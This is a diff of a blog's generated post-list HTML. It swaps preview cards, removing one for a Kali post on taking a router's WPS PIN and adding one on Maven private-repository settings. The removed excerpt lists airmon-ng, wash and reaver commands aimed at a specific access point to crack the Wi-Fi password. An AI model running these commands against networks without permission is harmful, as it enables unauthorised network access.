@@ -4314,6 +4314,18 @@
   
 
   
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
     
   
 
@@ -8898,71 +8910,6 @@
         
         
         <div class="col">
-          <a href="/posts/kali-qu-luyouqi-pinma/" class="card post-preview h-100">
-            <div class="card-body">
-              <!--
-  Date format snippet
-  See: ${JS_ROOT}/utils/locale-dateime.js
--->
-
-
-
-
-
-<em
-  class="small"
-  data-ts="1649569620"
-  data-df="ll"
-  
->
-  Apr 10, 2022
-</em>
-
-              <h4 class="pt-0 my-2" data-toc-skip>Kali拿取路由器pin码</h4>
-              <div class="text-muted small">
-                <p>
-                  
-
-
-
-
-
-                  网卡监听模式
-1
-airmon-ng start wlan0　　
-
-
-
-
-扫描
-1
-wash -i wlan0mon
-
-
-
-
-跑pin
-1
-2
-            网卡          物理地址         信道
-reaver -i wlan0mon -b 00:5A:13:40:AA:F8 -c 11 -vv -K 0
-
-
-
-
-通过pin获得wifi密码
-1
-2
-        ...
-                </p>
-              </div>
-            </div>
-          </a>
-        </div>
-      
-        
-        
-        <div class="col">
           <a href="/posts/jquery-geshihua-shijian/" class="card post-preview h-100">
             <div class="card-body">
               <!--
@@ -9019,6 +8966,63 @@ $(function(){
 function getDateString(time) {
     var datetime = new Date();
     datetime.se...
+                </p>
+              </div>
+            </div>
+          </a>
+        </div>
+      
+        
+        
+        <div class="col">
+          <a href="/posts/maven-lianjie-sifu-de-peizhi/" class="card post-preview h-100">
+            <div class="card-body">
+              <!--
+  Date format snippet
+  See: ${JS_ROOT}/utils/locale-dateime.js
+-->
+
+
+
+
+
+<em
+  class="small"
+  data-ts="1654753620"
+  data-df="ll"
+  
+>
+  Jun  9, 2022
+</em>
+
+              <h4 class="pt-0 my-2" data-toc-skip>Maven连接私服如何配置</h4>
+              <div class="text-muted small">
+                <p>
+                  
+
+
+
+
+
+                  Maven的setting.xml文件配置，该配置中使用了一个id为nexusProfile的profile，这个profile包含了相关的仓库配置，同时配置中又使用了activeProfile元素将这个profile激活，这样当执行Maven构件的时候，激活的profile会将仓库配置应用到项目中去。
+1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18...
                 </p>
               </div>
             </div>
